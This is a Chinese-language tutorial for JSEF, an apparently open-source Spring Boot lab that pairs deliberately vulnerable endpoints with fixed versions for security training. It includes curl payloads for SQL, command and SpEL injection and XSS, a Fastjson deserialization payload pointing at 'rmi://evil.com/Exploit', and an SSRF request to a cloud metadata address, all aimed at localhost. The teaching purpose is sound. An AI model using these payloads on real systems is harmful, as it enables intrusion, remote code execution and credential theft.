# JSEF 实战教程：从零上手 Web 安全漏洞学习

> 适合人群：Java 开发者、安全入门学习者、企业安全培训

---

## 一、这个项目是干什么的

JSEF（Java Security Education Framework）是一个基于 Spring Boot 3.x 的 **Web 安全漏洞实验平台**。

核心价值：**每个漏洞都有两份代码——一份有漏洞（`vuln`），一份已修复（`sec`），直接对比学习。**

覆盖 35+ 漏洞，包括 OWASP Top 10 全类型：SQL 注入、XSS、命令注入、SSRF、反序列化、越权访问等。

---

## 二、5 分钟启动

```bash
# 克隆项目
git clone --depth 1 https://github.com/XiaomingX/JSEF.git
cd JSEF

# 构建并启动（内置 H2 内存数据库，无需额外配置）
mvn clean package -DskipTests
java -jar target/java-sec-code-plus-1.2.0.jar
```

启动后访问：
- **Swagger API 文档**：http://localhost:8080/swagger-ui/index.html  ← 最常用入口
- **H2 数据库控制台**：http://localhost:8080/h2-console（JDBC URL: `jdbc:h2:mem:testdb`，用户名 `sa`，密码为空）
- **项目首页**：http://localhost:8080

---

## 三、API 路由规律（记住这一条就够了）

所有接口遵循统一格式：

```
/api/v1/{漏洞类型}/unsafe/{场景}   ← 有漏洞的实现
/api/v1/{漏洞类型}/safe/{场景}     ← 修复后的实现
```

例如：
```
GET /api/v1/sql-injection/unsafe/search-by-username?username=admin
GET /api/v1/sql-injection/safe/search-by-username?username=admin
GET /api/v1/command-injection/unsafe/raw-command?command=ls
GET /api/v1/xss/unsafe/reflect?input=<script>alert(1)</script>
```

---

## 四、高 ROI 学习路径（按优先级排序）

### 路径 1：注入类漏洞（最高频考点）

#### SQL 注入

```bash
# 1. 触发漏洞：用单引号破坏 SQL 结构
curl "http://localhost:8080/api/v1/sql-injection/unsafe/search-by-username?username=admin'"

# 2. 经典万能密码
curl "http://localhost:8080/api/v1/sql-injection/unsafe/search-by-username?username=admin'%20OR%20'1'='1"

# 3. 对比安全版本（预编译参数化查询，注入无效）
curl "http://localhost:8080/api/v1/sql-injection/safe/search-by-username?username=admin'%20OR%20'1'='1"
```

**核心对比**：
- 漏洞代码：`"SELECT * FROM users WHERE username = '" + username + "'"` — 字符串拼接
- 安全代码：`jdbcTemplate.query("SELECT * FROM users WHERE username = ?", username)` — 参数化查询

---

#### 命令注入

```bash
# 触发漏洞：注入额外命令
curl "http://localhost:8080/api/v1/command-injection/unsafe/raw-command?command=ls;whoami"

# 安全版本：白名单校验，拒绝分号等特殊字符
curl "http://localhost:8080/api/v1/command-injection/safe/ping?host=127.0.0.1"
```

---

#### SpEL 注入（Spring 特有，面试高频）

```bash
# SpEL 表达式执行任意代码
curl "http://localhost:8080/api/v1/spel-injection/unsafe/evaluate?expression=T(java.lang.Runtime).getRuntime().exec('whoami')"
```

---

### 路径 2：越权与认证绕过

#### 水平越权（IDOR）

```bash
# 用户 A 直接访问用户 B 的数据（只改 userId）
curl "http://localhost:8080/api/v1/idor/unsafe/user-info?userId=2"

# 安全版本：服务端校验当前登录用户是否有权访问
curl "http://localhost:8080/api/v1/idor/safe/user-info?userId=2"
```

#### 认证绕过

```bash
# 绕过登录校验直接访问管理接口
curl "http://localhost:8080/api/v1/auth-bypass/unsafe/admin"

# 对比：安全版本需要有效 Token
curl -H "Authorization: Bearer invalid_token" \
     "http://localhost:8080/api/v1/auth-bypass/safe/admin"
```

---

### 路径 3：敏感信息泄露

```bash
# 错误页面暴露堆栈信息
curl "http://localhost:8080/api/v1/sensitive-data/unsafe/error-page"

# 日志中明文打印手机号、身份证
curl "http://localhost:8080/api/v1/sensitive-data/unsafe/log-sensitive?phone=13800138000"
```

---

### 路径 4：反序列化漏洞（高危）

```bash
# Java 原生反序列化
curl -X POST "http://localhost:8080/api/v1/deserialization/unsafe/java" \
     -H "Content-Type: application/octet-stream" \
     --data-binary @payload.ser

# Fastjson 反序列化（CVE 经典案例）
curl -X POST "http://localhost:8080/api/v1/third-party/fastjson/unsafe/parse" \
     -H "Content-Type: application/json" \
     -d '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://evil.com/Exploit","autoCommit":true}'
```

---

### 路径 5：SSRF（服务端请求伪造）

```bash
# 让服务器访问内网地址
curl "http://localhost:8080/api/v1/ssrf/unsafe/fetch?url=http://169.254.169.254/latest/meta-data/"

# 安全版本：URL 白名单校验
curl "http://localhost:8080/api/v1/ssrf/safe/fetch?url=http://169.254.169.254/latest/meta-data/"
```

---

## 五、完整漏洞类型速查表

| 漏洞类型 | 不安全路由前缀 | 安全路由前缀 |
|---------|-------------|------------|
| SQL 注入 | `/api/v1/sql-injection/unsafe/` | `/api/v1/sql-injection/safe/` |
| 命令注入 | `/api/v1/command-injection/unsafe/` | `/api/v1/command-injection/safe/` |
| XSS | `/api/v1/xss/unsafe/` | `/api/v1/xss/safe/` |
| SpEL 注入 | `/api/v1/spel-injection/unsafe/` | — |
| SSRF | `/api/v1/ssrf/unsafe/` | `/api/v1/ssrf/safe/` |
| 路径遍历 | `/api/v1/path-traversal/unsafe/` | — |
| XXE | `/api/v1/xxe/unsafe/` | — |
| 反序列化 | `/api/v1/deserialization/unsafe/` | — |
| 越权访问 | `/api/v1/idor/unsafe/` | `/api/v1/idor/safe/` |
| 认证绕过 | `/api/v1/auth-bypass/unsafe/` | `/api/v1/auth-bypass/safe/` |
| CORS 配置 | `/api/v1/cors/unsafe/` | `/api/v1/cors/safe/` |
| 竞态条件 | `/api/v1/race-condition/unsafe/` | `/api/v1/race-condition/safe/` |
| 业务逻辑 | `/api/v1/business-logic/unsafe/` | `/api/v1/business-logic/safe/` |
| 加密漏洞 | `/api/v1/crypto/unsafe/` | `/api/v1/crypto/safe/` |
| LDAP 注入 | `/api/v1/ldap-injection/unsafe/` | — |
| 模板注入 | `/api/v1/template-injection/unsafe/` | — |
| CVE-2023-34050 | `/api/v1/cve202334050/unsafe/` | `/api/v1/cve202334050/safe/` |
| CVE-2023-42809 | `/api/v1/cve202342809/unsafe/` | `/api/v1/cve202342809/safe/` |

> 完整接口列表见 Swagger：http://localhost:8080/swagger-ui/index.html

---

## 六、最高效的学习方式（3 步法）

**第一步：看代码对比**

每个漏洞都在 `src/main/java/com/freedom/securitysamples/vulnerability/{漏洞名}/` 下：
```
{漏洞名}/
├── vuln/   ← 有漏洞的实现，看这里理解攻击原理
└── sec/    ← 修复后的实现，看这里学防御方案
```

**第二步：用 curl 或 Swagger 复现**

打开 Swagger UI，找到对应接口，直接在页面上输入 Payload 测试，无需写代码。

**第三步：改代码验证理解**

修改 `vuln/` 下的代码，加上安全修复，重启服务验证攻击是否还能成功。

---

## 七、Docker 快速部署（团队培训推荐）

```bash
docker build -t jsef:latest .
docker run -d -p 8080:8080 --name jsef jsef:latest
```

适合搭建团队共享的漏洞靶场环境，无需每人本地配置 JDK/Maven。

---

## 八、注意事项

- 本项目使用 **H2 内存数据库**，重启后数据清空，适合反复实验
- 所有漏洞仅用于**学习和内部培训**，禁止对未授权系统使用
- 生产环境绝对不能部署此项目
